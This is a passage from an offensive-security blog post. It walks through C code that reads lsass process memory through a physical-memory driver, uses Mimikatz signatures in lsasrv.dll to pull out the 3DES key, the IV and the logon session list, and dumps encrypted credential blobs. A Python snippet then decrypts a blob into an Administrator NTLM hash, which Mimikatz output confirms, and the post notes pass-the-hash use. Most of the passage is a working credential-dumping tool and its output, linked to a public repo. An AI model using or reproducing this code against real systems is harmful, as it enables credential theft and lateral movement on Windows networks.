        printf("[!] PathLen %d\n", pathLen);
        printf("[!] Buffer with path name 0x%08llx\n", filename);
        printf("[!] Path name: %S\n", path);
        */


        // Save the info in our list
        vadList[count - 1].id = count - 1;
        vadList[count - 1].vaddress = currentNode;
        vadList[count - 1].start = start;
        vadList[count - 1].end = end;
        vadList[count - 1].size = end - start;
        memset(vadList[count - 1].image, 0, MAX_PATH);
        if (path != NULL) {
            wcstombs(vadList[count - 1].image, path, MAX_PATH);
            free(path);
        } 

        count++;
        cursor++;
    }

    //Just print the VAD list
    printf("\t\t===================[VAD info]===================\n");
    for (int i = 0; i < VadCount; i++) {
        printf("[%lld] (0x%08llx) [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].id, vadList[i].vaddress, vadList[i].start, vadList[i].end, vadList[i].size);
        if (vadList[i].image[0] != 0) {
            printf(" |\n +---->> %s\n", vadList[i].image);
        }
    }
    printf("\t\t================================================\n");


    for (int i = 0; i < VadCount; i++) {
        if (!strcmp(vadList[i].image, "\\Windows\\System32\\lsasrv.dll")) { // Is this our target?
            printf("[!] LsaSrv.dll found! [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].start, vadList[i].end, vadList[i].size);
            // TODO lootLsaSrv(vadList[i].start, vadList[i].end, vadList[i].size);
            break;
        }
    }
    

    
    free(vadList);
    free(queue);
    return;
    
}
```

This looks like...

```
(...)
[161] (0xffffa48baf677ba0) [0x7ff8122b0000-0x7ff8122e0000] (196608 bytes)
 |
 +---->> \Windows\System32\CertPolEng.dll
[162] (0xffffa48bb1f640a0) [0x7ff8183e0000-0x7ff818422000] (270336 bytes)
 |
 +---->> \Windows\System32\ngcpopkeysrv.dll
[163] (0xffffa48bb1f63ce0) [0x7ff83df10000-0x7ff83df2a000] (106496 bytes)
 |
 +---->> \Windows\System32\tbs.dll
[164] (0xffffa48bb1f66a80) [0x7ff83e270000-0x7ff83e2e3000] (471040 bytes)
 |
 +---->> \Windows\System32\cryptngc.dll
                ================================================
[!] LsaSrv.dll found! [0x7ff845130000-0x7ff8452ce000] (1695744 bytes)
```

To recap at this point we:
1. Can translate virtual addresses to physical
2. Got the location of the LsaSrv.dll module inside the lsass process memory

# Stray Mimikatz sings Runnaway Boys

This time we are only interested in retrieving NTLM Hashes, so we are going to implement something like the `sekurlsa::msv` from Mimikatz as PoC (once we have located the process memory, and its modules, it is trivial to imitate any functionatility from Mimikatz so I picked the quickier to implement as PoC). 

This is well explained in the article "[Uncovering Mimikatz 'msv' and collecting credentials through PyKD](https://www.matteomalvica.com/blog/2020/01/20/mimikatz-lsass-dump-windg-pykd/)" from Matteo Malvica, so it is redundant to explain it again here... but in essence we are going to search for signatures inside lsasrv.dll and then retrieve the info needed to locate the `LogonSessionList` struct and the crypto keys/IVs needed. Also another good related article to read is "[Exploring Mimikatz - Part 1 - WDigest](https://blog.xpnsec.com/exploring-mimikatz-part-1/)" by [@_xpn_](https://twitter.com/_xpn_).

As I am imitating the post from Matteo Malvica, I am going to retrieve only the cryptoblob encrypted with Triple-DES. Here is our ~~shitty~~ code:

```c
void lootLsaSrv(ULONGLONG start, ULONGLONG end, ULONGLONG size) {
    LARGE_INTEGER reader;
    DWORD bytes_read = 0;
    LPSTR lsasrv = NULL;
    ULONGLONG cursor = 0;
    ULONGLONG lsasrv_size = 0;
    ULONGLONG original = 0;
    BOOL result; 
 

    ULONGLONG LogonSessionListCount = 0;
    ULONGLONG LogonSessionList = 0;
    ULONGLONG LogonSessionList_offset = 0;
    ULONGLONG LogonSessionListCount_offset = 0;
    ULONGLONG iv_offset = 0;
    ULONGLONG hDes_offset = 0;
    ULONGLONG DES_pointer = 0;

    unsigned char* iv_vector = NULL;
    unsigned char* DES_key = NULL;
    KIWI_BCRYPT_HANDLE_KEY h3DesKey;
    KIWI_BCRYPT_KEY81 extracted3DesKey;

    LSAINITIALIZE_NEEDLE LsaInitialize_needle = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
    LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
    
    PBYTE LsaInitialize_needle_buffer = NULL;
    PBYTE needle_buffer = NULL;

    int offset_LsaInitialize_needle = 0;
    int offset_LogonSessionList_needle = 0;

    ULONGLONG currentElem = 0;

    original = start;

    /* Save the whole region in a buffer */
    lsasrv = (LPSTR)malloc(size);
    while (start < end) {
        DWORD bytes_read = 0;
        DWORD bytes_written = 0;
        CHAR tmp = NULL;
        reader.QuadPart = v2p(start);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &tmp, 1, &bytes_read, NULL);
        lsasrv[cursor] = tmp;
        cursor++;
        start = original + cursor;
    }
    lsasrv_size = cursor;

    // Use mimikatz signatures to find the IV/keys
    printf("\t\t===================[Crypto info]===================\n");   
    LsaInitialize_needle_buffer = (PBYTE)malloc(sizeof(LSAINITIALIZE_NEEDLE));
    memcpy(LsaInitialize_needle_buffer, &LsaInitialize_needle, sizeof(LSAINITIALIZE_NEEDLE));
    offset_LsaInitialize_needle = memmem((PBYTE)lsasrv, lsasrv_size, LsaInitialize_needle_buffer, sizeof(LSAINITIALIZE_NEEDLE));
    printf("[*] Offset for InitializationVector/h3DesKey/hAesKey is %d\n", offset_LsaInitialize_needle);

    memcpy(&iv_offset, lsasrv + offset_LsaInitialize_needle + 0x43, 4);  //IV offset
    printf("[*] IV Vector relative offset: 0x%08llx\n", iv_offset);
    iv_vector = (unsigned char*)malloc(16);
    memcpy(iv_vector, lsasrv + offset_LsaInitialize_needle + 0x43 + 4 + iv_offset, 16);
    printf("\t\t[/!\\] IV Vector: ");
    for (int i = 0; i < 16; i++) {
        printf("%02x", iv_vector[i]);
    }
    printf(" [/!\\]\n");
    free(iv_vector);

    memcpy(&hDes_offset, lsasrv + offset_LsaInitialize_needle - 0x59, 4); //DES KEY offset
    printf("[*] 3DES Handle Key relative offset: 0x%08llx\n", hDes_offset);  
    reader.QuadPart = v2p(original + offset_LsaInitialize_needle - 0x59 + 4 + hDes_offset);
    DES_pointer = readPhysMemPointer(reader);
    printf("[*] 3DES Handle Key pointer: 0x%08llx\n", DES_pointer);

    reader.QuadPart = v2p(DES_pointer);
    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
    result = ReadFile(pmem_fd, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY), &bytes_read, NULL);
    reader.QuadPart = v2p((ULONGLONG)h3DesKey.key);
    result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
    result = ReadFile(pmem_fd, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81), &bytes_read, NULL);

    DES_key = (unsigned char*)malloc(extracted3DesKey.hardkey.cbSecret);
    memcpy(DES_key, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
    printf("\t\t[/!\\] 3DES Key: ");
    for (int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
        printf("%02x", DES_key[i]);
    }
    printf(" [/!\\]\n");
    free(DES_key);
    printf("\t\t================================================\n");

    needle_buffer = (PBYTE)malloc(sizeof(LOGONSESSIONLIST_NEEDLE));
    memcpy(needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
    offset_LogonSessionList_needle = memmem((PBYTE)lsasrv, lsasrv_size, needle_buffer, sizeof(LOGONSESSIONLIST_NEEDLE));

    memcpy(&LogonSessionList_offset, lsasrv + offset_LogonSessionList_needle + 0x17, 4);
    printf("[*] LogonSessionList Relative Offset: 0x%08llx\n", LogonSessionList_offset);

    LogonSessionList = original + offset_LogonSessionList_needle + 0x17 + 4 + LogonSessionList_offset;
    printf("[*] LogonSessionList: 0x%08llx\n", LogonSessionList);

    reader.QuadPart = v2p(LogonSessionList);
    printf("\t\t===================[LogonSessionList]===================");
    while (currentElem != LogonSessionList) {
        if (currentElem == 0) {
            currentElem = LogonSessionList;
        }
        reader.QuadPart = v2p(currentElem);
        currentElem = readPhysMemPointer(reader);
        //printf("Element at: 0x%08llx\n", currentElem);
        USHORT length = 0;
        LPWSTR username = NULL;
        ULONGLONG username_pointer = 0;

        reader.QuadPart = v2p(currentElem + 0x90);  //UNICODE_STRING = USHORT LENGHT USHORT MAXLENGTH LPWSTR BUFFER
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &length, 2, &bytes_read, NULL); //Read Lenght Field
        username = (LPWSTR)malloc(length + 2);
        memset(username, 0, length + 2);
        reader.QuadPart = v2p(currentElem + 0x98);
        username_pointer = readPhysMemPointer(reader); //Read LPWSTR
        reader.QuadPart = v2p(username_pointer);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, username, length, &bytes_read, NULL); //Read string at LPWSTR
        wprintf(L"\n[+] Username: %s \n", username);
        free(username);

        ULONGLONG credentials_pointer = 0;
        reader.QuadPart = v2p(currentElem + 0x108);
        credentials_pointer = readPhysMemPointer(reader);
        if (credentials_pointer == 0) {
            printf("[+] Cryptoblob: (empty)\n");
            continue;
        }
        printf("[*] Credentials Pointer: 0x%08llx\n", credentials_pointer);

        ULONGLONG primaryCredentials_pointer = 0;
        reader.QuadPart = v2p(credentials_pointer + 0x10);
        primaryCredentials_pointer = readPhysMemPointer(reader);
        printf("[*] Primary credentials Pointer: 0x%08llx\n", primaryCredentials_pointer);

        USHORT cryptoblob_size = 0;
        reader.QuadPart = v2p(primaryCredentials_pointer + 0x18);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, &cryptoblob_size, 4, &bytes_read, NULL);
        if (cryptoblob_size % 8 != 0) {
            printf("[*] Cryptoblob size: (not compatible with 3DEs, skipping...)\n");
            continue;
        }
        printf("[*] Cryptoblob size: 0x%x\n", cryptoblob_size);

        ULONGLONG cryptoblob_pointer = 0;
        reader.QuadPart = v2p(primaryCredentials_pointer + 0x20);
        cryptoblob_pointer = readPhysMemPointer(reader);
        //printf("Cryptoblob pointer: 0x%08llx\n", cryptoblob_pointer);

        unsigned char* cryptoblob = (unsigned char*)malloc(cryptoblob_size);
        reader.QuadPart = v2p(cryptoblob_pointer);
        result = SetFilePointerEx(pmem_fd, reader, NULL, FILE_BEGIN);
        result = ReadFile(pmem_fd, cryptoblob, cryptoblob_size, &bytes_read, NULL);
        printf("[+] Cryptoblob:\n");
        for (int i = 0; i < cryptoblob_size; i++) {
            printf("%02x", cryptoblob[i]);
        }
        printf("\n");
    }
    printf("\t\t================================================\n");
    free(needle_buffer);
    free(lsasrv);
}
``` 

If you wonder why I am not calling windows API to decrypt the info... It was 4:00 AM when we wrote this **:(**. Anyway, fire in the hole!

```
[!] LsaSrv.dll found! [0x7ff845130000-0x7ff8452ce000] (1695744 bytes)
                ===================[Crypto info]===================
[*] Offset for InitializationVector/h3DesKey/hAesKey is 305033
[*] IV Vector relative offset: 0x0013be98
                [/!\] IV Vector: d2e23014c6608529132d0f21144ee0df [/!\]
[*] 3DES Handle Key relative offset: 0x0013bf4c
[*] 3DES Handle Key pointer: 0x1d4d3610000
                [/!\] 3DES Key: 46bca8b85491846f5c7fb42700287d0437c49c15e7b76280 [/!\]
                ================================================
[*] LogonSessionList Relative Offset: 0x0012b0f1
[*] LogonSessionList: 0x7ff8452b52a0
                ===================[LogonSessionList]===================
[+] Username: Administrador
[*] Credentials Pointer: 0x1d4d3ba96c0
[*] Primary credentials Pointer: 0x1d4d3ae49f0
[*] Cryptoblob size: 0x1b0
[+] Cryptoblob:
f0e368d8302af9bbcd247687552e8207d766e674c99a61907e78a173d5e4d475df165ec1fcba3b5d3463f8bd7ce5fa6457d043147dcf26a6e03ec12d1216d57953a7f4cbdcaeec2c6a27787c332db706a5287a77957d09d546590d7f32a117f69d983290c01b1ad83cf66916ee76314c17605518a17d7ea9db2de530b1298e5178fcc638e1ae106542dcb46e37a09943dd10e3e2f15a99b93989361aa3a6e6ed8e98aab5578712bcf0f9e5a5372542f61a9032bf5d110278253c4f602107a02bf2cfe07fae7f81a4dee6440a596278e7c06eee06de5aa7f705bd6132dea0327ad869eca5da1538e098edfefcd050dd6e36a0a3196cdf5ee6786d0b62a3d526981f6c4fc503d43238887cf6f3c51cca01b912194242d7e5a76522aaf791c467ea6035a06219ea2aafc2860e6db56ddb77936871316e3f18fd9b1425f948c925171829e460cf7c31f9a0396705bcb1bfd0055b25de160cf816472180270f36e9224868d1377349f7bb001e7edfe52dbd1915a70fb686f850086732c57ba26423f7a3691ddb9b23b5f2166a56ee82d30571ffb79b222e707f6dc2cc5f986723d99229345b2d0b97371abb1573f59efecd6a
```

Let's decrypt with python (yeah, we know, we are the worst **:(**)

```
>>> from pyDes import *
>>> k = triple_des("46bca8b85491846f5c7fb42700287d0437c49c15e7b76280".decode("hex"), CBC, "\x00\x0d\x56\x99\x63\x93\x95\xd0")
>>> k.decrypt("f0e368d8302af9bbcd247687552e8207d766e674c99a61907e78a173d5e4d475df165ec1fcba3b5d3463f8bd7ce5fa6457d043147dcf26a6e03ec12d1216d57953a7f4cbdcaeec2c6a27787c332db706a5287a77957d09d546590d7f32a117f69d983290c01b1ad83cf66916ee76314c17605518a17d7ea9db2de530b1298e5178fcc638e1ae106542dcb46e37a09943dd10e3e2f15a99b93989361aa3a6e6ed8e98aab5578712bcf0f9e5a5372542f61a9032bf5d110278253c4f602107a02bf2cfe07fae7f81a4dee6440a596278e7c06eee06de5aa7f705bd6132dea0327ad869eca5da1538e098edfefcd050dd6e36a0a3196cdf5ee6786d0b62a3d526981f6c4fc503d43238887cf6f3c51cca01b912194242d7e5a76522aaf791c467ea6035a06219ea2aafc2860e6db56ddb77936871316e3f18fd9b1425f948c925171829e460cf7c31f9a0396705bcb1bfd0055b25de160cf816472180270f36e9224868d1377349f7bb001e7edfe52dbd1915a70fb686f850086732c57ba26423f7a3691ddb9b23b5f2166a56ee82d30571ffb79b222e707f6dc2cc5f986723d99229345b2d0b97371abb1573f59efecd6a".decode("hex"))[74:90].encode("hex")
'191d643eca7a6b94a3b6df1469ba2846'
```

We can check that effectively the Administrador's NTLM hash is `191d643eca7a6b94a3b6df1469ba2846`:

```
C:\Windows\system32>C:\Users\ortiga.japonesa\Downloads\mimikatz-master\mimikatz-master\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May  8 2021 00:30:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::msv
[!] LogonSessionListCount: 0x7ff8452b4be0
[!] LogonSessionList: 0x7ff8452b52a0
[!] Data Address: 0x1d4d3bfb5c0

Authentication Id : 0 ; 120327884 (00000000:072c0ecc)
Session           : CachedInteractive from 1
User Name         : Administrador
Domain            : ACUARIO
Logon Server      : WIN-UQ1FE7E6SES
Logon Time        : 08/05/2021 0:44:32
SID               : S-1-5-21-3039666266-3544201716-3988606543-500
        msv :
         [00000003] Primary
         * Username : Administrador
         * Domain   : ACUARIO
         * NTLM     : 191d643eca7a6b94a3b6df1469ba2846 
         * SHA1     : 5f041d6e1d3d0b3f59d85fa7ff60a14ae1a5963d
         * DPAPI    : b4772e37b9a6a10785ea20641c59e5b2
```

MMmm... that PtH smell...

# EoF
Playing with Windows Internals and reading Mimikatz code is a nice exercise to learn and practice new things. As we said at the begin, probably this approach is not the best (our knowledge on this topic is limited), so if you spot errors/misconceptions/typos please contact us so we can fix it.

The code can be found in our repo as [SnoopyOwl](https://github.com/Adepts-Of-0xCC/SnoopyOwl).


We hope you enjoyed this reading! Feel free to give us feedback at our twitter [@AdeptsOf0xCC](https://twitter.com/AdeptsOf0xCC).


